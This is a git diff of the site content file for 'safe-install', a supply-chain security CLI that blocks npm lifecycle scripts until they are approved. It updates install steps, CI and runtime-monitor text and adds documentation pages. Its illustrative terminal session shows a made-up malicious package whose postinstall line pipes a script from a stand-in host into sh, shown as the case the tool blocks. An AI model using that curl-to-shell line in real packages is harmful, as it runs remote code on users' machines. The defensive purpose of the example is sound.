@@ -10,7 +10,6 @@ import { distribution, globalFlags, repo } from './facts';
 
 /** Derived from the cited module path so there is one place to change it. */
 const REPO_URL = `https://${repo.value}`;
-const DOWNLOAD_URL = `${REPO_URL}/releases/latest/download`;
 const RELEASES_URL = `${REPO_URL}/releases/latest`;
 const SECURITY_URL = `${REPO_URL}/blob/main/SECURITY.md`;
 
@@ -31,6 +30,7 @@ export const en: SiteContent = {
     { label: 'Runtime monitor', href: '/#monitor' },
     { label: 'CI', href: '/#ci' },
     { label: 'Install', href: '/#install' },
+    { label: 'Docs', href: '/docs/' },
   ],
 
   hero: {
@@ -43,7 +43,13 @@ export const en: SiteContent = {
     installTabs: [
       {
         os: 'macOS',
-        samples: [{ label: 'Homebrew', lang: 'bash', code: distribution.value.homebrew }],
+        samples: [
+          {
+            label: 'Homebrew',
+            lang: 'bash',
+            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
+          },
+        ],
       },
       {
         os: 'Linux',
@@ -51,55 +57,57 @@ export const en: SiteContent = {
           {
             label: '.deb',
             lang: 'bash',
-            code: `curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.deb\nsudo dpkg -i safe-install_0.1.0_linux_amd64.deb`,
+            code: `# download the .deb from ${RELEASES_URL}\n${distribution.deb.value}`,
           },
-          { label: '.rpm', lang: 'bash', code: distribution.value.rpm },
+          {
+            label: 'Homebrew',
+            lang: 'bash',
+            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
+          },
         ],
       },
       {
         os: 'Windows',
-        samples: [{ label: 'Scoop', lang: 'powershell', code: distribution.value.scoop }],
+        samples: [
+          {
+            label: 'Scoop',
+            lang: 'powershell',
+            code: `${distribution.scoopBucket.value}\n${distribution.scoopInstall.value}`,
+          },
+        ],
       },
     ],
 
     terminalTitle: 'zsh — ~/projects/app',
     // Illustrative session: the shape, rule IDs and commands are all real,
     // the package name and its numbers are a worked example.
+    // Illustrative session in the CLI's real output format. The package name and
+    // its script are a worked example; the messages, rule IDs and prompt are real.
     terminalLines: [
       { text: '$ safe-install', tone: 'prompt' },
-      { text: '' },
-      { text: '  safe-install  ·  npm  ·  412 packages from package-lock.json', tone: 'muted' },
-      { text: '' },
-      { text: '  Analyzing dependency tree…', tone: 'muted' },
-      { text: '' },
-      { text: '  ⚠ dotenv-helper@4.2.1  ·  risk 74  ·  high', tone: 'danger' },
       {
-        text: '    SI-SCR-002  script downloads and executes remote code       block',
-        tone: 'danger',
+        text: 'safe-install: using npm (package-lock.json); lifecycle scripts disabled; new versions must be 72h old',
+        tone: 'muted',
       },
-      { text: '      postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
-      {
-        text: '    SI-REC-001  version published 3h ago                        medium',
-        tone: 'warn',
-      },
-      {
-        text: '    SI-POP-002  4 weekly downloads                              medium',
-        tone: 'warn',
-      },
+      { text: 'added 412 packages in 9s', tone: 'muted' },
       { text: '' },
-      {
-        text: '  412 packages  ·  7 want to run install scripts  ·  6 approved by policy',
-        tone: 'info',
-      },
+      { text: '2 package(s) want to run install scripts.', tone: 'info' },
       { text: '' },
-      { text: '  ?  dotenv-helper@4.2.1 — run this script?', tone: 'info' },
-      { text: '    ❯ Block it', tone: 'ok' },
-      { text: '      Run it once and remember', tone: 'muted' },
-      { text: '      Show me the script first', tone: 'muted' },
+      { text: 'dotenv-helper@4.2.1 (direct)  risk: BLOCK', tone: 'danger' },
+      { text: '  postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
+      { text: '  ! SI-SCR-002  postinstall script downloads and executes code', tone: 'danger' },
+      { text: '  ! SI-REC-001  published 3h ago (minimum release age 3d)', tone: 'warn' },
+      { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: n', tone: 'info' },
       { text: '' },
+      { text: 'esbuild@0.25.10 (direct)  risk: MEDIUM', tone: 'warn' },
+      { text: '  postinstall: node install.js', tone: 'muted' },
+      { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: y', tone: 'info' },
+      { text: '' },
+      { text: 'safe-install: ran install scripts for 1 package(s), skipped 1', tone: 'ok' },
       { text: '$ _', tone: 'prompt' },
     ],
-    footnote: 'Illustrative session. Rule IDs and commands are real; the package is an example.',
+    footnote:
+      'Illustrative session in the real output format. The malicious package is an example.',
   },
 
   problem: {
@@ -129,37 +137,37 @@ export const en: SiteContent = {
     lede: 'Downloading and extracting a tarball is harmless. Executing it is not. safe-install separates the two, which is why the same approach works identically on Linux, macOS and Windows.',
     steps: [
       {
-        id: 'analyze',
-        title: 'Analyze',
-        body: 'Read the lockfile, resolve the entire dependency tree, pull registry metadata, and score every package for risk — before anything has been executed.',
-      },
-      {
         id: 'install',
         title: 'Install',
-        body: 'Run your package manager with all lifecycle scripts disabled. Tarballs are downloaded and extracted exactly as they normally would be, minus the code execution.',
+        body: 'Run your package manager with every lifecycle script disabled, your project’s own included. Tarballs are downloaded and extracted as usual, minus the code execution.',
+      },
+      {
+        id: 'analyze',
+        title: 'Analyze',
+        body: 'Read the lockfile for the whole tree, find every installed package that wants to run a script, and score it: the script and the file it runs, plus registry, provenance and malware-database checks. `safe-install check` scores the entire tree without installing.',
       },
       {
         id: 'inspect',
         title: 'Inspect',
-        body: 'List every package that wants to run a script and show you the script itself, flagged with the rules it trips and the evidence behind each one.',
+        body: 'Show each script with the rules it trips and the evidence behind them, so you decide with the code in front of you.',
       },
       {
         id: 'approve',
         title: 'Approve',
-        body: 'You approve per package@version, interactively or through a policy file your team commits. Approvals pin to the script’s content hash.',
+        body: 'Approve per package, interactively or through a `.safe-install.json` your team commits. Approvals pin to a hash of the scripts and the files they run, so a changed script asks again.',
       },
       {
         id: 'run',
         title: 'Run',
-        body: 'Execute only the scripts you approved, using each package manager’s own rebuild path. On Linux, optionally under the runtime monitor.',
+        body: 'Run only the approved scripts, dependencies first, with `npm run <stage>` in each package’s directory. On Linux, optionally under the runtime monitor.',
       },
     ],
-    note: 'Every step is a plain CLI invocation — nothing is cached between runs and nothing is left running afterwards.',
+    note: 'Every step is a plain CLI invocation: nothing is left running afterwards, and only registry metadata is cached between runs.',
   },
 
   checks: {
     eyebrow: 'What it checks',
-    heading: 'Thirteen rules, six questions.',
+    heading: 'Eighteen rules, seven questions.',
     lede: 'Every finding carries a rule ID, a severity and the evidence that triggered it — so you can look up exactly why something was flagged and decide for yourself.',
     families: [
       {
@@ -194,7 +202,14 @@ export const en: SiteContent = {
       {
         id: 'vulns',
         title: 'Is this a known-bad version?',
-        blurb: 'Published advisories are matched against the exact resolved version.',
+        blurb:
+          'Every resolved version is looked up in OSV. Known malware blocks outright; ordinary vulnerabilities are reported one level below their advisory severity.',
+      },
+      {
+        id: 'monitor',
+        title: 'What did the script actually do? (Linux)',
+        blurb:
+          'With --monitor, approved scripts run under strace and their network, credential and persistence behaviour is reported, or stopped.',
       },
     ],
     severities: [
@@ -209,7 +224,8 @@ export const en: SiteContent = {
       {
         id: 'advisory',
         label: 'Per advisory',
-        description: 'Severity comes from the advisory itself.',
+        description:
+          'Malware entries block; other advisories count one level below their severity.',
       },
     ],
     scoringNote:
@@ -217,13 +233,13 @@ export const en: SiteContent = {
     explainNote: 'Not sure what a rule means? `safe-install explain SI-SCR-002` tells you.',
     releaseAgeGate: {
       heading: 'It does not just warn about fresh versions. It refuses them.',
-      body: 'Every supply-chain hijack needs a freshly compromised release, because that is the only moment a maintainer account can push something new and the next audit will catch. So rather than flagging a version published three hours ago and installing it anyway, safe-install resolves to the newest version that is at least minReleaseAge old. The bad release never lands.',
+      body: 'A hijacked package needs a freshly published release, and most are caught and unpublished within days. So rather than only flagging a version published three hours ago, safe-install asks your package manager to skip anything younger than minReleaseAge (72h by default). The bad release never lands.',
       native:
-        'When your package manager has a native setting, safe-install uses it: the gate is computed from policy and passed straight through.',
+        'safe-install passes the age to your package manager’s own setting, so new resolutions skip versions younger than minReleaseAge. Versions already in your lockfile are kept, and `check` flags them.',
       fallback:
-        'When it does not, safe-install resolves your direct dependencies itself — semver range intersected with the age cutoff, newest version that survives — and pins them. Transitive dependencies are then caught by SI-REC-001 as findings.',
+        'Yarn classic has no such setting. There, install says so, and `safe-install check` still flags every fresh version as SI-REC-001.',
       override:
-        'Packages you trust to move fast can be excluded by glob, and --min-age overrides the gate for a single run. --min-age 0 turns it off.',
+        'minReleaseAgeExclude exempts packages you trust to move fast from the findings, --min-age overrides the age for one run, and --min-age 0 turns it off.',
       credit: 'The idea is borrowed from safe-npm.',
     },
   },
@@ -231,7 +247,7 @@ export const en: SiteContent = {
   packageManagers: {
     eyebrow: 'Works with your package manager',
     heading: 'One interface, five adapters.',
-    lede: 'safe-install does not reimplement npm. It drives whichever package manager your project already uses, with scripts switched off, and calls that manager’s own rebuild command for the scripts you approve.',
+    lede: 'safe-install does not reimplement npm. It drives whichever package manager your project already uses, with scripts switched off, then runs exactly the approved lifecycle stages itself, the same way for all five.',
     columns: [
       { key: 'name', label: 'Package manager' },
       { key: 'lockfile', label: 'Lockfile' },
@@ -239,7 +255,7 @@ export const en: SiteContent = {
       { key: 'runApproved', label: 'Run approved' },
     ],
     detectionNote:
-      'Detected automatically — by which lockfile is present, then the `packageManager` field in `package.json`, then the `--pm` flag if you need to be explicit.',
+      'Detected automatically from the lockfile, then the `packageManager` field in `package.json`; `--pm` overrides both. A pinned pnpm or Yarn version runs through corepack, so you get exactly that version.',
   },
 
   whyGo: {
@@ -249,7 +265,7 @@ export const en: SiteContent = {
     reasons: [
       {
         title: 'One static binary per OS and architecture',
-        body: 'No runtime, no package manager, no `node` on the target machine. A single ~10 MB file runs the same on a developer laptop, a locked-down CI runner and a production container.',
+        body: 'No runtime and no package manager on the target machine. A single file of under 10 MB runs the same on a developer laptop, a locked-down CI runner and a production container.',
       },
       {
         title: 'Cross-compilation is not a project',
@@ -265,7 +281,7 @@ export const en: SiteContent = {
       },
       {
         title: 'Few dependencies, on purpose',
-        body: 'Lockfile formats are parsed with the standard library, not a framework. A tool that asks you to trust it with your supply chain should not also ask you to trust forty transitive packages.',
+        body: 'Two direct dependencies: cobra for the CLI and go-yaml for pnpm and Yarn lockfiles. A tool that asks you to trust it with your supply chain should not also ask you to trust forty transitive packages.',
       },
     ],
     comparisonHeading: 'The honest version',
@@ -291,20 +307,20 @@ export const en: SiteContent = {
       'A supply-chain security tool installed through the supply chain it protects is a weak story. If you install safe-install from npm, a compromised npm can hand you a compromised safe-install — and the one tool you were relying on is the thing that got through. Homebrew, Scoop and signed release artifacts instead.',
     releaseHeading: 'Signed, and reproducible',
     releaseBody:
-      'Releases are built with GoReleaser and GitHub Actions, published with cosign keyless signatures and SLSA provenance, and built reproducibly with -trimpath so anyone can rebuild the same bytes from the same source.',
+      'Releases are built by GoReleaser in GitHub Actions with -trimpath and fixed timestamps, ship SBOMs, sign checksums.txt with cosign keyless signing, and carry SLSA build provenance you can check with gh attestation verify.',
   },
 
   monitor: {
     eyebrow: 'Linux only — the runtime monitor',
     heading: 'Watch what the approved script actually does.',
     lede: 'Static analysis tells you what a script is written to do. The runtime monitor tells you what it did. On approved scripts, safe-install can observe them live and report — or kill — anything suspicious.',
-    howHeading: 'Two backends, one set of signals',
+    howHeading: 'strace, scoped to the script',
     backendBody:
-      'When CAP_BPF or root is available, eBPF tracepoints on sys_enter_execve, connect and openat give direct kernel-level visibility. Without them, safe-install falls back to strace -f, tracing the same three syscalls. With neither, the monitor reports that it is unavailable rather than pretending it is watching.',
+      'safe-install hands itself to npm as the script shell and runs each approved script under strace -f. Only the script and its children are traced, never the package manager, and no root is needed. Without strace installed, --monitor says so instead of pretending to watch.',
     signalsHeading: 'What it watches for',
     actionHeading: 'Report, or kill',
     actionBody:
-      'By default the monitor only reports. Pass --monitor=kill and a high-severity event takes down the whole process tree, which is what you want when a script you approved turns out not to be the script you read.',
+      'By default the monitor only reports. With --monitor=kill, the first high-severity event kills the script’s process group. strace sees a syscall once it has happened, so that first action is not prevented; everything after it is.',
     copy: {
       neutral: 'Checking your platform…',
       roasts: {
@@ -327,7 +343,7 @@ export const en: SiteContent = {
         linux: {
           headline: "You're on Linux. Of course it works.",
           jabs: [
-            'eBPF if you have CAP_BPF, strace if you do not. Both are already here, in the kernel, waiting for us.',
+            'strace is one package away, and ptrace has been in your kernel since before npm existed.',
           ],
           isSmug: true,
         },
@@ -346,34 +362,16 @@ export const en: SiteContent = {
     eyebrow: 'CI',
     heading: 'Fail the build, not your afternoon.',
     lede: 'In CI, safe-install runs non-interactively: no prompts, a machine-readable report, and an exit code your pipeline can branch on.',
-    commandHeading: 'The whole check',
+    commandHeading: 'Or run it yourself',
+    command: 'safe-install check --fail-on high --sarif-file results.sarif',
     exitCodesHeading: 'Exit codes',
     exitCodesNote:
-      'Stable contract for pipelines — the names below are the four the tool promises to return.',
-    workflowTitle: '.github/workflows/supply-chain.yml',
+      'Stable contract for pipelines. Declining a prompt is not an error: that script is skipped.',
+    workflowTitle: 'The GitHub Action',
     workflow: {
-      label: 'GitHub Actions',
+      label: 'workflow step',
       lang: 'yaml',
-      code: `name: supply-chain
-
-on: [push, pull_request]
-
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 22
-      - run: npm ci
-      - name: Check dependency tree
-        run: safe-install check --ci --format=sarif
-      - name: Upload SARIF
-        if: always()
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: safe-install.sarif`,
+      code: distribution.action.value,
     },
     flagNote: `Also available: ${globalFlags.value.join(' · ')}`,
   },
@@ -386,51 +384,314 @@ jobs:
       {
         id: 'homebrew',
         title: 'Homebrew',
-        summary: 'macOS and Linux, via the tap.',
-        samples: [{ label: 'brew', lang: 'bash', code: distribution.value.homebrew }],
+        summary:
+          'macOS and Linux. The tap is this repository. On macOS, the cask prints the one-line command to clear the quarantine flag, since the binary is not notarized yet.',
+        samples: [
+          {
+            label: 'brew',
+            lang: 'bash',
+            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
+          },
+        ],
       },
       {
         id: 'scoop',
         title: 'Scoop',
-        summary: 'Windows.',
-        samples: [{ label: 'powershell', lang: 'powershell', code: distribution.value.scoop }],
+        summary: 'Windows. The bucket is this repository.',
+        samples: [
+          {
+            label: 'powershell',
+            lang: 'powershell',
+            code: `${distribution.scoopBucket.value}\n${distribution.scoopInstall.value}`,
+          },
+        ],
       },
       {
         id: 'packages',
-        title: '.deb and .rpm',
-        summary: 'Linux packages with a system package manager.',
+        title: '.deb, .rpm and .apk',
+        summary: 'Linux packages from the latest release; they recommend strace for --monitor.',
         samples: [
-          { label: 'Debian / Ubuntu', lang: 'bash', code: distribution.value.deb },
-          { label: 'Fedora / RHEL', lang: 'bash', code: distribution.value.rpm },
+          {
+            label: 'Debian / Ubuntu',
+            lang: 'bash',
+            code: `# download the .deb from ${RELEASES_URL}\n${distribution.deb.value}`,
+          },
+          { label: 'from source', lang: 'bash', code: distribution.goInstall.value },
         ],
       },
       {
         id: 'verify',
-        title: 'Direct download, verified',
+        title: 'Verify a download',
         summary:
-          'Every release ships a checksum and a cosign keyless signature. Verify before you run it.',
-        samples: [
-          {
-            label: 'verify',
-            lang: 'bash',
-            code: `curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz
-curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz.sig
-curl -LO ${DOWNLOAD_URL}/safe-install_0.1.0_linux_amd64.tar.gz.pem
-
-cosign verify-blob \\
-  --certificate safe-install_0.1.0_linux_amd64.tar.gz.pem \\
-  --certificate-identity '${distribution.value.keylessIdentity}' \\
-  --certificate-oidc-issuer '${distribution.value.keylessIssuer}' \\
-  safe-install_0.1.0_linux_amd64.tar.gz.sig
-
-tar xzf safe-install_0.1.0_linux_amd64.tar.gz
-sudo install safe-install /usr/local/bin/`,
-          },
-        ],
+          'checksums.txt is signed with Sigstore (keyless, bound to the release workflow) and every artifact carries SLSA build provenance.',
+        samples: [{ label: 'verify', lang: 'bash', code: distribution.verify.value }],
       },
     ],
     dropInNote:
       'There is deliberately no npm package. A supply-chain security tool installed through the channel it protects is a weak story — Homebrew, Scoop and signed binaries instead.',
+  },
+
+  docs: {
+    navLabel: 'Docs',
+    sourceLabel: 'from the CLI',
+    editLabel: 'Something wrong? Open an issue',
+    index: {
+      title: 'Documentation',
+      description:
+        'How to install, run, configure and automate safe-install. Every command on these pages is copied from the CLI’s own README.',
+      sections: [],
+    },
+    gettingStarted: {
+      title: 'Getting started',
+      description: 'Install the binary, verify it, and run it in a project.',
+      sections: [
+        {
+          id: 'install',
+          title: 'Install',
+          body: [
+            'safe-install is one static binary per platform. Homebrew and Scoop install it from this repository, the Linux packages come from the latest release, and `go install` builds it from source.',
+            'It is deliberately not published to npm: a supply-chain tool should not arrive through the channel it protects.',
+          ],
+        },
+        {
+          id: 'verify',
+          title: 'Verify a download',
+          body: [
+            '`checksums.txt` is signed with Sigstore, keyless and bound to the repository’s release workflow, and every artifact carries SLSA build provenance. Check both before you run a downloaded binary.',
+          ],
+        },
+        {
+          id: 'first-run',
+          title: 'First run',
+          body: [
+            'In a project with a `package.json`, run `safe-install`. It detects your package manager, installs with every lifecycle script switched off, then asks about each package that wants to run one.',
+            'Answer `y` for packages you trust, such as esbuild or sharp. Your answers are saved to `.safe-install.json`; commit it so your team and CI share them.',
+          ],
+        },
+      ],
+    },
+    usage: {
+      title: 'Usage',
+      description: 'install, add, the approval prompt, and the commands that manage scripts.',
+      sections: [
+        {
+          id: 'install',
+          title: 'Install and add',
+          body: [
+            '`safe-install` (or `safe-install install`) installs what your lockfile describes; `safe-install add` adds packages. Flags after `--` go to your package manager.',
+          ],
+        },
+        {
+          id: 'flow',
+          title: 'What happens',
+          body: [
+            'Your package manager installs with lifecycle scripts disabled, your project’s own included. safe-install then reads every installed `package.json`, finds the packages with `preinstall`, `install` or `postinstall` scripts (or a `binding.gyp`), and scans each script and the file it runs, together with registry and malware-database checks.',
+            'Approved scripts run dependencies first, with `npm run <stage>` inside each package’s directory, so npm must be on your PATH. Your project’s own lifecycle scripts are never run for you: safe-install prints which ones it skipped.',
+          ],
+        },
+        {
+          id: 'prompt',
+          title: 'The prompt',
+          body: [
+            'For each package that is not approved yet, safe-install shows the scripts and every finding, then asks:',
+          ],
+        },
+        {
+          id: 'modes',
+          title: 'Terminal, --yes and CI',
+          body: [
+            'Recorded approvals always apply. What happens to the others depends on how safe-install runs:',
+          ],
+        },
+        {
+          id: 'package-managers',
+          title: 'Package managers',
+          body: [],
+        },
+        {
+          id: 'commands',
+          title: 'Managing scripts',
+          body: [
+            '`safe-install scripts` lists installed packages with scripts and their approval state. `safe-install approve` records an approval and runs the scripts; high or blocking risk needs `--force`.',
+          ],
+        },
+        {
+          id: 'shell-init',
+          title: 'Use it every time',
+          body: [
+            '`safe-install shell-init` prints shell functions that send `npm install`, `pnpm add`, `yarn`, `bun i` and friends through safe-install. It changes nothing on its own; add the line yourself.',
+          ],
+        },
+      ],
+      answers: [
+        { key: 'y', meaning: 'Run the scripts and record the approval in .safe-install.json.' },
+        { key: 'o', meaning: 'Run them this once, without recording anything.' },
+        { key: 'N (default)', meaning: 'Skip them. The package may not work until they run.' },
+      ],
+      modes: [
+        { when: 'In a terminal', what: 'You are asked about each package.' },
+        {
+          when: 'With --yes',
+          what: 'Packages below high risk are approved for this run, without being recorded.',
+        },
+        {
+          when: 'Without a terminal, or with --ci',
+          what: 'Nothing new is approved. With --ci, an unapproved high-risk script exits with 1.',
+        },
+      ],
+    },
+    policy: {
+      title: 'Policy and approvals',
+      description: 'The .safe-install.json file, how approvals work, and the release-age gate.',
+      sections: [
+        {
+          id: 'file',
+          title: 'The policy file',
+          body: [
+            'Approvals and settings live in `.safe-install.json` at the root of your project. Commit it: your team and your CI then share one set of reviewed scripts.',
+          ],
+        },
+        {
+          id: 'fields',
+          title: 'Fields',
+          body: [],
+        },
+        {
+          id: 'approvals',
+          title: 'Approvals are pinned to content',
+          body: [
+            'An approval stores a hash of each script command and of the files those commands run with node. A version bump that leaves the scripts unchanged stays approved.',
+            'If the scripts or those files change, safe-install reports `SI-SCR-005`, does not run them, and asks again. That covers the common attack where `install.js` changes while the command stays `node install.js`.',
+          ],
+        },
+        {
+          id: 'locations',
+          title: 'Project and user files',
+          body: [
+            'A user-wide file with the same format applies to every project (`safe-install approve --global` writes to it). The project file wins on conflicts, and command-line flags win over both.',
+          ],
+        },
+        {
+          id: 'release-age',
+          title: 'Release-age gate',
+          body: [
+            '`minReleaseAge` (or `--min-age`, default `72h`) is passed to your package manager’s own setting, so new resolutions skip younger versions: npm `--before`, pnpm `minimumReleaseAge`, Yarn berry `npmMinimalAgeGate`, bun `--minimum-release-age`. Yarn classic has none; `safe-install check` still flags fresh versions there.',
+            '`minReleaseAgeExclude` exempts packages from the findings only: the age handed to the package manager applies to every package.',
+          ],
+        },
+      ],
+      fields: [
+        {
+          name: 'allowScripts',
+          meaning: 'Approvals by package name: version reviewed, content hash, date.',
+        },
+        {
+          name: 'minReleaseAge',
+          meaning: 'Minimum age of new versions, e.g. 72h or 3d; 0 disables.',
+        },
+        {
+          name: 'minReleaseAgeExclude',
+          meaning: 'Package name globs exempt from release-age findings, e.g. @types/*.',
+        },
+        {
+          name: 'failOn',
+          meaning: 'The level at which check exits 1: low, medium, high, block or none.',
+        },
+      ],
+      locations: [
+        { where: 'Project', path: '.safe-install.json' },
+        { where: 'User, Linux', path: '~/.config/safe-install/config.json' },
+        { where: 'User, macOS', path: '~/Library/Application Support/safe-install/config.json' },
+        { where: 'User, Windows', path: '%AppData%\\safe-install\\config.json' },
+      ],
+    },
+    checkAndCi: {
+      title: 'Check and CI',
+      description: 'Score a lockfile without installing, and fail pipelines on risky dependencies.',
+      sections: [
+        {
+          id: 'check',
+          title: 'safe-install check',
+          body: [
+            '`check` scores every package in the lockfile without installing anything: release age, publisher and provenance changes, integrity, typosquats, rarely used packages with install scripts, and the OSV database. Output is text, JSON or SARIF.',
+            'It talks to your registry, to OSV (package names and versions) and to npm’s download counts API for rarely used packages with scripts. `--offline` uses cached registry data only and skips both.',
+          ],
+        },
+        {
+          id: 'exit-codes',
+          title: 'Exit codes',
+          body: [],
+        },
+        {
+          id: 'action',
+          title: 'GitHub Action',
+          body: [
+            'The action downloads the release binary for the runner, verifies its checksum, runs `check`, and fails the job when a package reaches `fail-on`. With `sarif: true`, findings appear in code scanning, pointing at the lockfile line.',
+          ],
+        },
+      ],
+      inputs: [
+        {
+          name: 'working-directory',
+          meaning: 'Where package.json and the lockfile are. Default .',
+        },
+        { name: 'fail-on', meaning: 'low, medium, high, block or none. Default high.' },
+        {
+          name: 'min-age',
+          meaning: 'Minimum release age, e.g. 72h or 3d; 0 disables. Default 72h.',
+        },
+        {
+          name: 'sarif',
+          meaning: 'Upload results to code scanning; needs security-events: write. Default false.',
+        },
+        {
+          name: 'version',
+          meaning: 'latest, a tag like v0.1.0, or source to build from the action’s checkout.',
+        },
+      ],
+    },
+    monitor: {
+      title: 'Runtime monitor',
+      description: 'Watch approved install scripts as they run, on Linux.',
+      sections: [
+        {
+          id: 'how',
+          title: 'How it works',
+          body: [
+            'With `--monitor`, safe-install hands itself to npm as the script shell and runs each approved script under `strace -f`. Only the script and its children are traced, never the package manager, so npm reading its own `.npmrc` is not a false alarm. No root is needed; install `strace` with your package manager.',
+            'A script that itself calls `npm run` stays traced: the nested run executes inside the same trace.',
+          ],
+        },
+        {
+          id: 'signals',
+          title: 'What it reports',
+          body: [],
+        },
+        {
+          id: 'kill',
+          title: 'Report or kill',
+          body: [
+            'By default the monitor reports and the script finishes. With `--monitor=kill`, the first high-risk event kills the script’s process group and the install fails. With `--ci`, any high-risk finding exits with 1.',
+          ],
+        },
+        {
+          id: 'limits',
+          title: 'Limits',
+          body: [
+            'strace sees a syscall once it has happened, so kill mode stops the script after its first dangerous action, not before it. Writes through relative paths count as inside the package, and network destinations show as IP addresses.',
+            'macOS and Windows have no `--monitor`; everything else in safe-install works the same there.',
+          ],
+        },
+      ],
+    },
+    rules: {
+      title: 'Rules',
+      description:
+        'Every finding safe-install can report: why it matters and what to do. The same text as `safe-install explain`.',
+      sections: [],
+      whyLabel: 'Why it matters',
+      fixLabel: 'What to do',
+    },
   },
 
   footer: {
